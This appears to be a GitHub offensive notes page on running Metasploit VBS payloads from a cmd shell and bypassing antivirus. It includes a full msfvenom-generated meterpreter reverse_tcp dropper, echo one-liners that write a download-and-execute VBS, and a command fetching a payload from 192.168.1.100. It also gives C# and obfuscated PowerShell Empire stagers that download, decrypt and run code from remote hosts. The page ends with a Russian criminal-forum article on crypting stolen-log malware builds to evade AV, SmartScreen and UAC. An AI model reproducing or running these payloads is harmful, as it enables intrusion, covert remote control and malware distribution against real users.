https://github.com/sayhi2urmom/Antivirus_R3_bypass_demo


## Execute metasploit vbs payload in cmd shell

If you are a pentester/researcher,  you may want to gain a meterpreter session from a cmd shell at sometimes, ex: (sqlmap --os-shell, or other tools). Ex:

```
$ ncat -l -p 4444
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.  

C:\Documents and Settings\test\Desktop>ver
ver  

Microsoft Windows XP [Version 5.1.2600]
C:\Documents and Settings\test\Desktop>
```

In the previous, you want try the following methods:

  - a. translate exe into a batch script.
  - b. download the payload file from remote server (ftp, tftp, http, ....)
  - c. ....

Now, I'll show you how to run metasploit payload in cmd.exe.  Please try to think about the following questions:

1. How to generate a  payload with msfvenom ?
2. How to run  payload in a simple/compatible way ?

----

## How to generate a  payload with msfvenom ?

In order to test the payload on Windows XP/2003,  we choose the vbs format . If you need help, please try [msfvenom -h]

```
$ msfvenom -p windows/meterpreter/reverse_tcp
 LHOST=192.168.1.100 LPORT=4444 -f vbs --arch x86 --platform win

 No encoder or badchars specified, outputting raw payload
 Payload size: 333 bytes
 Final size of vbs file: 7370 bytes
 Function oSpLpsWeU(XwXDDtdR)
  urGQiYVn = "" & _           
  XwXDDtdR & ""      
  Set gFMdOBBiLZ = CreateObject("MSXML2.DOMDocument.3.0")
  gFMdOBBiLZ.LoadXML(urGQiYVn)
  oSpLpsWeU = gFMdOBBiLZ.selectsinglenode("B64DECODE").nodeTypedValue
  set gFMdOBBiLZ = nothing
 End Function

 Function skbfzWOqR()
  cTENSbYbnWY = "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"
  Dim GBHMAfCsea
  Set GBHMAfCsea = CreateObject("Scripting.FileSystemObject")
  Dim nYosrMtHSIOKSTI
  Dim LNXsqHXEKZQU
  Set nYosrMtHSIOKSTI = GBHMAfCsea.GetSpecialFolder(2)
  LNXsqHXEKZQU = nYosrMtHSIOKSTI & "\" & GBHMAfCsea.GetTempName()
  GBHMAfCsea.CreateFolder(LNXsqHXEKZQU)
  YeQZhbvaLPekFW = LNXsqHXEKZQU & "\" & "QoziwORKliqRDPs.exe"
  Dim voFeIDpffjdo
  Set voFeIDpffjdo = CreateObject("Wscript.Shell")
  WwqoNcaCIbw = oSpLpsWeU(cTENSbYbnWY)
  Set WQwWDbhse = CreateObject("ADODB.Stream")
  WQwWDbhse.Type = 1
  WQwWDbhse.Open
  WQwWDbhse.Write WwqoNcaCIbw
  WQwWDbhse.SaveToFile YeQZhbvaLPekFW, 2
  voFeIDpffjdo.run YeQZhbvaLPekFW, 0, true
  GBHMAfCsea.DeleteFile(YeQZhbvaLPekFW)
  GBHMAfCsea.DeleteFolder(LNXsqHXEKZQU)
End Function

skbfzWOqR
```

## How to run  payload in a simple/compatible way ?

Read the code, we can create a simple vbs script called msf.vbs to execute the shellcode. A vbs script can be executed on Windows XP/2003/Vista/7/8/10/2008/2012/....

```
shellcode = WScript.Arguments.Item(0)
strXML = "" & shellcode & ""
Set oXMLDoc = CreateObject("MSXML2.DOMDocument.3.0")
oXMLDoc.LoadXML(strXML) decode = oXMLDoc.selectsinglenode("B64DECODE").nodeTypedValue
set oXMLDoc = nothing
 Dim fso
Set fso = CreateObject("Scripting.FileSystemObject")
Dim tempdir
Dim basedir
Set tempdir = fso.GetSpecialFolder(2)
basedir = tempdir & "\" & fso.GetTempName()
fso.CreateFolder(basedir)
tempexe = basedir & "\" & "test.exe"
Dim adodbstream
Set adodbstream = CreateObject("ADODB.Stream")
adodbstream.Type = 1
adodbstream.Open
adodbstream.Write decode
adodbstream.SaveToFile tempexe, 2
Dim wshell
Set wshell = CreateObject("Wscript.Shell")
wshell.run tempexe, 0, true
fso.DeleteFile(tempexe)
fso.DeleteFolder(basedir)

Ok, how to run it in cmd.exe ? Do you want  to paste the code line by line ?  A simple command is created as follow:

```

upload msf.vbs to vuln lab with a single command,

```
echo shellcode = WScript.Arguments.Item(0):strXML = ^"^^" ^& shellcode ^& ^"^<^/B64DECODE^>^":Set oXMLDoc = CreateObject(^"MSXML2.DOMDocument.3.0^"):oXMLDoc.LoadXML(strXML):decode = oXMLDoc.selectsinglenode(^"B64DECODE^").nodeTypedValue:set oXMLDoc = nothing:Dim fso:Set fso = CreateObject(^"Scripting.FileSystemObject^"):Dim tempdir:Dim basedir:Set tempdir = fso.GetSpecialFolder(2):basedir = tempdir ^& ^"\^" ^& fso.GetTempName():fso.CreateFolder(basedir):tempexe = basedir ^& ^"\^" ^& ^"test.exe^":Dim adodbstream:Set adodbstream = CreateObject(^"ADODB.Stream^"):adodbstream.Type = 1:adodbstream.Open:adodbstream.Write decode:adodbstream.SaveToFile tempexe, 2:Dim wshell:Set wshell = CreateObject(^"Wscript.Shell^"):wshell.run tempexe, 0, true:fso.DeleteFile(tempexe):fso.DeleteFolder(basedir) > %TEMP%\msf.vbs
```

execute metasploit payload with msf.vbs and cscript.exe

```
C:\Documents and Settings\test\Desktop> cscript.exe msf.vbs <msf-vbs-shellcode>
```

![](msf-execute-vbs-payload.png)


## Bypass nc shell buffer size limit

If the script is used in cmd.exe on localhost, everything goes well. But if it is used in netcat cmd shell, the payload will be broken. ex:

```
C:\Documents and Settings\test\Desktop>cscript.exe %TEMP%\msf.vbs TVqQAAMAA.....AAAAAP

Microsoft (R) Windows Script Host Version 5.7
Copyright (C) Microsoft Corporation. All rights reserved.

C:\DOCUME~1\test\LOCALS~1\Temp\msf.vbs(1, 53) Microsoft VBScript compilation error: Syntax error
```

- origin payload size: 6160
- netcat handle payload size: 4068

Pleae try it yourself, For security tests, another vbs script is created.

```
echo strFileURL = WScript.Arguments.Item(0):Set objXMLHTTP = CreateObject(^"MSXML2.XMLHTTP^"):objXMLHTTP.open ^"GET^", strFileURL, false:objXMLHTTP.send():shellcode = objXMLHTTP.responseText:strXML = ^"^<B64DECODE xmlns:dt=^" ^& Chr(34) ^& ^"urn:schemas-microsoft-com:datatypes^" ^& Chr(34) ^& ^" ^" ^& ^"dt:dt=^" ^& Chr(34) ^& ^"bin.base64^" ^& Chr(34) ^& ^"^>^" ^& shellcode ^& ^"^<^/B64DECODE^>^":Set oXMLDoc = CreateObject(^"MSXML2.DOMDocument.3.0^"):oXMLDoc.LoadXML(strXML):decode = oXMLDoc.selectsinglenode(^"B64DECODE^").nodeTypedValue:set oXMLDoc = nothing:Dim fso:Set fso = CreateObject(^"Scripting.FileSystemObject^"):Dim tempdir:Dim basedir:Set tempdir = fso.GetSpecialFolder(2):basedir = tempdir ^& ^"\^" ^& fso.GetTempName():fso.CreateFolder(basedir):tempexe = basedir ^& ^"\^" ^& ^"test.exe^":Dim adodbstream:Set adodbstream = CreateObject(^"ADODB.Stream^"):adodbstream.Type = 1:adodbstream.Open:adodbstream.Write decode:adodbstream.SaveToFile tempexe, 2:Dim wshell:Set wshell = CreateObject(^"Wscript.Shell^"):wshell.run tempexe, 0, true:fso.DeleteFile(tempexe):fso.DeleteFolder(basedir):Set fso = Nothing > %TEMP%\msf.vbs
```

Run the following command to execute your vbs payload:

```
START /B cscript.exe %TEMP%\msf.vbs http://192.168.1.100:8080/payload.txt
```

![](msf-download-execute-vbs-payload.png)


## ByPassAV Empire-PowerShell part 1


```markdown
using System;
using System.Collections.Generic;
using System.Linq;
using System.Management.Automation;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
 
namespace PSEmpire_Stage1
{
    class Program
    {
        // RC4 Class to decrypt the stage 2 data
        // Created by Jeong ChangWook. Source https://gist.github.com/hoiogi/89cf2e9aa99ffc3640a4
        public class RC4
        {
            public static byte[] Encrypt(byte[] pwd, byte[] data)
            {
                int a, i, j, k, tmp;
                int[] key, box;
                byte[] cipher;
 
                key = new int[256];
                box = new int[256];
                cipher = new byte[data.Length];
 
                for (i = 0; i < 256; i++)
                {
                    key[i] = pwd[i % pwd.Length];
                    box[i] = i;
                }
                for (j = i = 0; i < 256; i++)
                {
                    j = (j + box[i] + key[i]) % 256;
                    tmp = box[i];
                    box[i] = box[j];
                    box[j] = tmp;
                }
                for (a = j = i = 0; i < data.Length; i++)
                {
                    a++;
                    a %= 256;
                    j += box[a];
                    j %= 256;
                    tmp = box[a];
                    box[a] = box[j];
                    box[j] = tmp;
                    k = box[((box[a] + box[j]) % 256)];
                    cipher[i] = (byte)(data[i] ^ k);
                }
                return cipher;
            }
 
            public static byte[] Decrypt(byte[] pwd, byte[] data)
            {
                return Encrypt(pwd, data);
            }
 
        }
 
        // Hide Windows function by our friends from StackOverFlow
        // https://stackoverflow.com/questions/34440916/hide-the-console-window-from-a-console-application
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
 
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
        static void Main(string[] args)
        {
            // To Hide the ConsoleWindow (It may be a better way...)
            var handle = GetConsoleWindow();
            ShowWindow(handle, 0);
 
            // Avoid sending Expect 100 Header 
            System.Net.ServicePointManager.Expect100Continue = false;
 
            // Create a WebClient Object (No Proxy Support Included)
            WebClient wc = new WebClient();
            string ua = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
            wc.Headers["User-Agent"] = ua;
            wc.Headers["Cookie"] = "session=968PH6bE9CDkwYGfsUPraz0x5PQ=";
 
            // Set the Server Address and URL 
            string server = "http://192.168.6.119:8081";
            string target = "/CWoNaJLBo/VTNeWw11212/";
 
            // Download The Data or Stage 2
            byte[] data = wc.DownloadData(server + target);
 
            // Extract IV
            byte[] iv = data.Take(4).Select(i => i).ToArray();
 
            // Remove the IV from the data
            byte[] data_noIV = data.Skip(4).ToArray();
 
            // Set Key value for decryption. PowerEmpire StageingKey value 
            string key = "fdcece0a22c10f83dccc8f17c95a33d4";
            byte[] K = Encoding.ASCII.GetBytes(key);
 
            // Combine the IV + Key (New random key each time)
            byte[] IVK = new byte[iv.Length + K.Length];
            iv.CopyTo(IVK, 0);
            K.CopyTo(IVK, iv.Length);
 
            // Decrypt the Message
            byte[] decrypted = RC4.Decrypt(IVK, data_noIV);
 
            // Convert the stage2 decrypted message from bytes to ASCII
            string stage2 = System.Text.Encoding.ASCII.GetString(decrypted);
 
            // Create a PowerShell Object to execute the command 
            PowerShell PowerShellInstance = PowerShell.Create();
 
            // Create the variables $ser and $u which are part of the downloaded stage2
            PowerShellInstance.Runspace.SessionStateProxy.SetVariable("ser", server);
            PowerShellInstance.Runspace.SessionStateProxy.SetVariable("u", ua);
 
            // Add the Script Stage 2 to the Powershell Object
            PowerShellInstance.AddScript(stage2);
 
            // Execute the Script!
            PowerShellInstance.Invoke();
 
        }
    }
}
```

compile:

`csc.exe PSEmpireStage1.cs /reference:C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll`


For more details see [video](https://www.youtube.com/watch?v=0jaC8156BEE)

## ByPassAV Empire-PowerShell part 2

[360 fud](https://blog.flanker017.me/testing-empire-as-post-exploitation-framework-in-domain-environment)

```markdown

"[SYsTem.NET.SErvIcePOInTMANAgER]::EXPecT100CONtiNuE=0;$WC=NEW-OBjECT SYstem.NeT.WEBCliENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0)
like Gecko';$WC.HeAdErS.Add('User-Agent',$u);$WC.PRoxY= [SYStem.NEt.WEbREqUEsT]::DEfaulTWEBPrOxY;$WC.ProxY.CreDEnTials = [SySTEm.NET.CreDenTIalCache]::DeFAUltNETWOrkCReDentIALs;$Script:Proxy = $wc.Proxy;$K= [SYStEm.TeXT.ENCodiNG]::ASCII.GEtBytES('JV+~fgh!GFWZ8=eiEN{[#}&x_XLtHKT7');$R= {$D,$K=$ArgS;$S=0..255;0..255|%{$J=($J-(-$S[$_])- (-$K[$_%$K.CoUnt]))%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H= ($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_- bXoR$S[($S[$I]+$S[$H])%256]}};$ser='http://172.16.3.77:80';$t='/news.php';$Wc.HEaDERs.AD joIN[ChAr[]](& $R $datA ($IV+$K))|IEX"

```

[fully-undetectable-backdooring-pe-file](https://haiderm.com/fully-undetectable-backdooring-pe-file/)

[PowerEmpire-Stage-1-to-CSharp](https://plaintext.do/AV-Evasion-Converting-PowerEmpire-Stage-1-to-CSharp-EN/)




### Криптография и крипт файла. Вся теория и подноготная. Срываю покровы и раскладываю по полочкам.



Вдогонку моей темы по инсталлам и методам их добычи у селлеров, я решил написать возможно самую главную статью на тему, которая стоит особняком, сверкая всеми цветами радуги, и о которой вы нигде не найдете никакой информации. Вообще нигде, я гарантирую это :)

Итак, встречайте – кровавая мозоль, гнойный нарыв и головная боль каждого, кто работает с логами, трафиком и инсталлами – крипт файла!

Это оригинал статьи, ибо сейчас разные хуесосы, начнут её по разным форумам растаскивать, выдавая за своё авторство. Автор указан выше. Статья расположена по указанной ссылке на telegra.ph 
Что вы узнаете из данной статьи:

~ Что такое крипт файла, что туда входит, что не входит, а что вообще из другой оперы.

~ Почему 99% крипто-сервисов на рынке – это бесполезная пустышка, с адской переплатой денег.

~ Разница между «уник» и «паблик» стабом.

~ В чём разница между скантаймом и рантаймом?

~ Рантайм – почему это не совсем чтобы крипт и не совсем чтобы простое дело?

~ Прогруз файла в браузере

~ Смартскрин

~ Что делать по итогу и как решать вопрос с криптом?

~ И многое-многое-многое другое!

Статья основана строго на богатом эмпирическом опыте работы с добычей логов и как следствие криптом разного рода файлов. По итогу пришлось вообще полностью отказаться от паблик-сервисов, затем приват-сервисов, а потом с головой погрузиться в подноготную данной ниши. С результатами я вас как раз и ознакомлю в данной статье. 

Кому эта стать полезная?
~ Совсем новичкам, чтобы сразу понимать общую картину мира и подводные камни.

~ Опытным людям, которым уже надоело платить черт знает за что, которое один фиг либо не работает, либо работает криво.

~ Крипторам, который решили поднять уровень своего сервиса (чем чертЪ не шутит, может и такие тут будут).

Кому пройти мимо:

~ Мамкиным воителям и обезьянам с отстуком по 200% Вам один фиг ничего не докажешь, и любую информация, которая в ваш квадртно-гнездовой способ мышления не вписывается, вам объяснять бесполезно.

Сразу 3 нюанса
Первое. Статью в этот раз я буду писать простым и общенародным языком, без эпитетелиальных словокручений и нейроломких фразосочетаний вместе с конлингивистическими неологизмами. В общем, обойдемся без языковых кривляний, ибо тема сложная на самом деле. Профессионалы могут найти множество упрощений, при правильной передачи сути - я вынужден ориентироваться на обычного пользователя.

Второе. Я тут не собираюсь обхаивать сервисы и показывать, что я самый умный и так далее. Если какая-то хреновина не работает, то не нужно сложными словами (которыми обычно собственную профессиональную никчемность прикрывают) объяснять, почему на самом деле она работает. В данном случае я буду рассказывать, как проверить работоспособность и почему большая часть крипторов – обезьяны, которые умеют лишь одну кнопку нажимать. ВСЁ! Не больше. Если у вас есть хороший сервис, который вашим условиям удовлетворяет – это отлично, радуйтесь. Если ваш сервис еще и мои методы проверки проходит – так вообще радуйтесь вдвойне. Редкую птицу за хвост ухватили.

Третье. Я не собираюсь расписывать всё сугубо профессионально-техническими терминами. Как минимум я не технарь ультра-класса. Моя задача правильно передать суть и объяснить на пальцах, что должно быть и как работать по итогу. А так же личный опыт подсказывает, чем больше умных слов и терминов вываливает человек, тем больше он ссытся, что его уровень как профессионала – стремиться к нулю. Почему? Да потом что настоящий эксперт может объяснить любую тему как простыми словами для новичка, так и научными словами для профессионала.

Что такое крипт файла и зачем он нужен?
Если данную статью читают совсем новички, то придется объяснять с азов. Грубо говоря, файл криптуют, чтобы для антивирусов этот файл выглядел белым и пушистым. То есть его можно скачать и запустить, без каких-либо последствий со стороны этого самого АВ.

В общем-то, на этом задача крипта заканчивается. Но народные легенды постепенно начали приписывать, ему (крипту то бишь) совершенно волшебные свойства, и теперь в 2020 году, «грамотный крипт» разве что не лечит лейкемию 4 стадии.

Системы активных и проактивных защит ОС
Что такое крипт разобрались. Теперь разложим по полочкам следующий вопрос, о котором мало кто понимает в общем и целом, и над некоторыми аспектами в частности. Итак, рассмотрим все системы защиты от и до по порядку. По каждому из пунктов пройдемся дополнительно в дальнейшем.

1) Прогруз файла в браузере – обозначает «способность» файла проходить проверку браузера и не выдавать разного рода алерты (файл опасный, файл потенциально опасный, файл редко скачивается, файл заблокирован и т.д.). Прогруз должен работать просто – файл скачался и готов к открытию. Всё! Без иных вариантов.

2) Статичная проверка антивируса или ScanTime – АВ проводит проверку прямо внутри браузера при скачивании файла. За успешное прохождение отвечает хороший крипт. Эта опция иногда может быть отключена, у некоторых антивирусов, таким образом, скантайм проверка выполняться не будет.

То есть подведем промежуточный итог – для того чтобы файл скачался без проблем и без алертов, должны быть пройдены 2 системы защиты – браузера и антивируса.
3)     UAC – иногда сервисы любят понтонуться, что у них реализован обход User Account Control.  С запросом на открытие файла при скачивании из браузера ничего общего не имеет. В общем-то, вам лишний алерт ни к чему, поэтому стоит озадачиться обходом, благо это несложно.

4)     Динамическая проверка АВ при запуске или так называемый RunTime – при запуске файла АВ начинается активно его проверять по своим алгоритмам. За прохождение отвечает крипт, который должен выдержать эту проверку. Если что-то не понравилось – болт. О разнице между скантаймом и рантаймом поговорим чуть попозже. А о рантайме, где всё до крайности непросто, уделим отдельный блок статьи.

5)     Смартскрин – еще одна система проактивный защиты, не связанная с антивирусом. Проверяет подпись файла и его сертификацию. Если что-то не нравится, начинает задавать вопросы на тему: «Уверены, что хотите запустить файл?». Логика работы вне человеческой сферы понимания. Рассмотрим отдельно, ибо информации насчет смартскрина вы нигде больше не найдете. 

То есть подведем окончательный итог – для того чтобы файл запустился без проблем должны быть пройдены еще 2 системы защиты – динамической проверки антивируса и смартскрина. Если ваш билд рабочий (а многие крипты убивают работоспособность билда, кстати) – получите долгожданный отстук в панель.

Проверяем крипт на качество – шаг первый
